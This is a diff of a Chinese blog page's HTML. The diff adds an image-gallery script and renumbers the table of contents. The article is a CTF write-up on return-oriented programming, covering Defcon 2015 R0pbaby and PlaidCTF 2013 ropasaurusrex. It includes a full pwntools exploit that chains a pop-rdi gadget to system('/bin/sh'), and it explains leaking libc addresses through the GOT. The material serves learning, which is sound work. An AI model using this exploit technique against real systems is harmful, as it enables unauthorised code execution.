@@ -122,7 +122,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%B0%E4%BB%A3%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80%EF%BC%9AROP"><span class="toc-number">1.</span> <span class="toc-text">现代栈溢出利用技术基础：ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CTF%E4%B8%ADROP%E7%9A%84%E5%B8%B8%E8%A7%84%E5%A5%97%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">CTF中ROP的常规套路:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Defcon-2015-Qualifier%EF%BC%9AR0pbaby"><span class="toc-number">1.2.</span> <span class="toc-text">Defcon 2015 Qualifier：R0pbaby</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0-pop-rdi"><span class="toc-number">1.3.</span> <span class="toc-text">如何找到 pop rdi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PlaidCTF-2013-ropasaurusrex"><span class="toc-number">1.4.</span> <span class="toc-text">PlaidCTF 2013: ropasaurusrex</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E6%9D%A5%E8%87%AA%E8%92%B8%E7%B1%B3-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5-rop"><span class="toc-number"></span> <span class="toc-text">上面的内容来自蒸米 -一步一步 rop</span></a>
+      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#CTF%E4%B8%ADROP%E7%9A%84%E5%B8%B8%E8%A7%84%E5%A5%97%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">CTF中ROP的常规套路:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Defcon-2015-Qualifier%EF%BC%9AR0pbaby"><span class="toc-number">2.</span> <span class="toc-text">Defcon 2015 Qualifier：R0pbaby</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0-pop-rdi"><span class="toc-number">3.</span> <span class="toc-text">如何找到 pop rdi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PlaidCTF-2013-ropasaurusrex"><span class="toc-number">4.</span> <span class="toc-text">PlaidCTF 2013: ropasaurusrex</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E6%9D%A5%E8%87%AA%E8%92%B8%E7%B1%B3-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5-rop"><span class="toc-number"></span> <span class="toc-text">上面的内容来自蒸米 -一步一步 rop</span></a>
     </div>
   </span>
 </div>
@@ -171,7 +171,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h4 id="现代栈溢出利用技术基础：ROP"><a href="#现代栈溢出利用技术基础：ROP" class="headerlink" title="现代栈溢出利用技术基础：ROP"></a>现代栈溢出利用技术基础：ROP</h4><p>承接上一个篇目，这里继续讲ROP的一些题目分析。讲真的，我这里基本上的题目以及攻击方式都来自于<em>Atum</em>师傅在X-MAN的PPT。</p>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="现代栈溢出利用技术基础：ROP"><a href="#现代栈溢出利用技术基础：ROP" class="headerlink" title="现代栈溢出利用技术基础：ROP"></a>现代栈溢出利用技术基础：ROP</h4><p>承接上一个篇目，这里继续讲ROP的一些题目分析。讲真的，我这里基本上的题目以及攻击方式都来自于<em>Atum</em>师傅在X-MAN的PPT。</p>
 <h5 id="CTF中ROP的常规套路"><a href="#CTF中ROP的常规套路" class="headerlink" title="CTF中ROP的常规套路:"></a>CTF中ROP的常规套路:</h5><ul>
 <li>第一次触发漏洞，通过ROP泄漏libc的address(如puts_got)，计算system地址，然后返回到一个可以重现触发漏洞的位置(如main)，再次触发漏洞，通过ROP调用system(“/bin/sh”)</li>
 <li>直接execve(“/bin/sh”, [“/bin/sh”], NULL)，通常在静态链接时比较常用<br>三个练习:</li>
@@ -183,7 +183,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : ENABLED</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure>
 <p>gdb-peda 自带的 checksec 有检测程序是否开启保护，以及所开启的保护。我们可以看到，<em>R0pbaby</em> 所开启的保护有FORTIFY以及NX，这里我们主要所收到的限制是栈上写入的数据不可执行。<br>以及，程序可以知道是６４位的，它的传参优先由寄存器完成。<br>接着，我们应该了解程序的流程，以及找到程序的漏洞，以及思考其利用方式。</p>
 <p>*尝试运行程序</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-01.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-01.png"></a></p>
 <p>我们去尝试运行，摸清了基本上的程序的功能。</p>
 <ol>
 <li>功能1，可以获得libc的基址</li>
@@ -191,13 +191,13 @@
 <li>功能3，输入的地方，感觉这个地方可能存在漏洞。</li>
 </ol>
 <p>紧接着，我们可以用IDA 分析程序了。</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-02.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-02.png"></a></p>
 <p>发现一个函数的不适当应用，拷贝的过程中没有判断大小，可能造成缓冲区溢出。</p>
 <hr>
 <p>函数原型<br>void  * memcpy(void*dest, const void * src, size_t n);<br>由src指向地址为起始地址的连续n个字节的数据复制到以destin指向地址为起始地址的空间内。</p>
 <hr>
-<p>savedregs是一个IDA关键字，我们可以看到 保存的堆栈帧指针和函数返回地址：在IDA中，我们可以直接单击它。<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-03.png"></p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-04.png"></p>
+<p>savedregs是一个IDA关键字，我们可以看到 保存的堆栈帧指针和函数返回地址：在IDA中，我们可以直接单击它。<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-03.png"></a></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-04.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-04.png"></a></p>
 <p>buf的大小应该是8没错，之后可能造成缓冲区溢出，那么我的解题思路大概是如下：</p>
 <ol>
 <li>我们需要找到一个gadget RDI 用来起shell</li>
@@ -217,7 +217,7 @@
 <p>至于sytem函数，程序的第二个功能已经给我们了，至此，我们可以开始构造我们的exp了.</p>
 <p>system = 0x00007FFFF784F390  #get_libc_base()<br>rdi_gadget_offset = 0x21102<br>bin_sh_offset = 0x18c177<br>system_offset = 0x45390</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug =<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug ==<span class="number">1</span>:</span><br><span class="line">  io = process(<span class="string">&quot;./r0pbaby&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">  <span class="comment">#db.attach(io)</span></span><br><span class="line"></span><br><span class="line">system = <span class="number">0x00007FFFF784F390</span><span class="comment">#get_libc_base()</span></span><br><span class="line">rdi_gadget_offset = <span class="number">0x21102</span></span><br><span class="line">bin_sh_offset = <span class="number">0x18c177</span></span><br><span class="line">system_offset = <span class="number">0x45390</span></span><br><span class="line">libc_base = system - system_offset <span class="comment"># system addr - system_offset = libc_base</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] libc base: [%x]&quot;</span> % libc_base</span><br><span class="line">rdi_gadget_addr = libc_base + rdi_gadget_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] RDI gadget addr: [%x]&quot;</span> % rdi_gadget_addr</span><br><span class="line">bin_sh_addr = libc_base + bin_sh_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] \&quot;/bin/sh\&quot; addr: [%x]&quot;</span> % bin_sh_addr</span><br><span class="line">system_addr = <span class="number">0x00007FFFF784F390</span><span class="comment">#get_libc_func_addr(h, &quot;system&quot;)</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] system addr: [%x]&quot;</span> % system_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(rdi_gadget_addr)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.send(<span class="string">&quot;%d\n&quot;</span>%(len(payload)+<span class="number">1</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-05.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-05.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-05.png"></a></p>
 <p>至此 一个简单的64位程序 ROP Pwn题完成！！撒花　撒花～</p>
 <h5 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013: ropasaurusrex"></a>PlaidCTF 2013: ropasaurusrex</h5><p>上一个程序简单的调用 system + “bin/sh” 通过寄存器 gadget  “pop rdi;ret “传参起shell，接着我们来完成第二个pwn，第二个pwn的特点是，我们需要去info leak 得到信息，然后计算system 的地址。</p>
 <p>依旧是老三套，我们先分析一下程序开启的保护。</p>
@@ -242,7 +242,12 @@
 <p>小结一下：<br>read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）</p>
 <h2 id="上面的内容来自蒸米-一步一步-rop"><a href="#上面的内容来自蒸米-一步一步-rop" class="headerlink" title="上面的内容来自蒸米 -一步一步 rop"></a>上面的内容来自蒸米 -一步一步 rop</h2><p>做了两个简单的rop 第一个的64位，第二个是32位，基本上 也能体会到两者的区别了，一者是寄存器传参，一者是栈传参。至于AliCTF的vsvs ，我没找到Bin程序，所以这里就不单独分析了。我们看看别人的wp，例如链接<a href="https://segmentfault.com/a/1190000005718685">https://segmentfault.com/a/1190000005718685</a></p>
 <p>下一个内容准备学习 VROP，一种利用signal机制的ROP技术。</p>
-
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
   </div>
 </article>
 
@@ -279,7 +284,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%B0%E4%BB%A3%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80%EF%BC%9AROP"><span class="toc-number">1.</span> <span class="toc-text">现代栈溢出利用技术基础：ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CTF%E4%B8%ADROP%E7%9A%84%E5%B8%B8%E8%A7%84%E5%A5%97%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">CTF中ROP的常规套路:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Defcon-2015-Qualifier%EF%BC%9AR0pbaby"><span class="toc-number">1.2.</span> <span class="toc-text">Defcon 2015 Qualifier：R0pbaby</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0-pop-rdi"><span class="toc-number">1.3.</span> <span class="toc-text">如何找到 pop rdi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PlaidCTF-2013-ropasaurusrex"><span class="toc-number">1.4.</span> <span class="toc-text">PlaidCTF 2013: ropasaurusrex</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E6%9D%A5%E8%87%AA%E8%92%B8%E7%B1%B3-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5-rop"><span class="toc-number"></span> <span class="toc-text">上面的内容来自蒸米 -一步一步 rop</span></a>
+      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#CTF%E4%B8%ADROP%E7%9A%84%E5%B8%B8%E8%A7%84%E5%A5%97%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">CTF中ROP的常规套路:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Defcon-2015-Qualifier%EF%BC%9AR0pbaby"><span class="toc-number">2.</span> <span class="toc-text">Defcon 2015 Qualifier：R0pbaby</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0-pop-rdi"><span class="toc-number">3.</span> <span class="toc-text">如何找到 pop rdi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PlaidCTF-2013-ropasaurusrex"><span class="toc-number">4.</span> <span class="toc-text">PlaidCTF 2013: ropasaurusrex</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E6%9D%A5%E8%87%AA%E8%92%B8%E7%B1%B3-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5-rop"><span class="toc-number"></span> <span class="toc-text">上面的内容来自蒸米 -一步一步 rop</span></a>
     </div>
 
     <div id="share-footer" style="display: none">
